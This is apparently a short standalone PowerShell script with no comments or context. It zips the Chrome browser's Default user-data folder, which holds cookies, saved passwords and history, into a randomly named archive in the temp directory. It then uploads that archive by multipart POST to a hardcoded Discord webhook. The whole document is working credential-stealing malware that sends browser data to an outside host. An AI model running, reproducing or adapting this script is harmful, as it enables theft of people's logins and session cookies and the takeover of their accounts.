$chromeUserDataPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
$randomName = [System.IO.Path]::GetRandomFileName().Split('.')[0]
$destinationPath = "$env:TEMP\$randomName.zip"
$webhookUrl = "https://discord.com/api/webhooks/1208762543263326279/mLDNFnzaa6YhmWDAkgEgu3PAX6pM-8A8UDo5bD2Pdncqa9y3Rz23yD0ZlP5jdjv8Q3tq"

if (Test-Path $chromeUserDataPath) {
    Add-Type -AssemblyName 'System.IO.Compression.FileSystem'
    [System.IO.Compression.ZipFile]::CreateFromDirectory($chromeUserDataPath, $destinationPath)
    $fileContent = Get-Content $destinationPath -Raw
    $boundary = [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"
    $payload = "--$boundary$LF"
    $payload += "Content-Disposition: form-data; name=`"file`"; filename=`"$randomName.zip`"$LF"
    $payload += "Content-Type: application/octet-stream$LF$LF"
    $payload += $fileContent
    $payload += $LF
    $payload += "--$boundary--$LF"
    Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $payload
}
